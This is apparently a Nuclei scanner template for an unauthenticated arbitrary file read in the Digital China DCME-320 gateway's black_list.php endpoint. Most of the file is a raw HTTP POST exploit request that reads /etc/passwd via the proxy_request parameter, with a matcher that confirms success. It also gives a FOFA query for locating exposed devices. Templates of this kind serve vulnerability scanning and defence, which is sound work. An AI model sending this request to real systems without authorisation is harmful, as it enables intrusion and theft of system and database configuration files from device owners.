http:
    - matchers:
        - part: body
          regex:
            - root:.*:0:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /function/auth/user/black_list.php HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          proxy_request=/etc/passwd
id: digitalchina-DCME-black_list_php-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="style/blue/css/dcn_ui.css"
        神州数码 DCME-320出口网关 black_list.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 神州数码 DCME-320出口网关 black_list.php 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/XaIsDrs0mvSQGJgkB8x8mA
    severity: high
    tags:
        - File reading
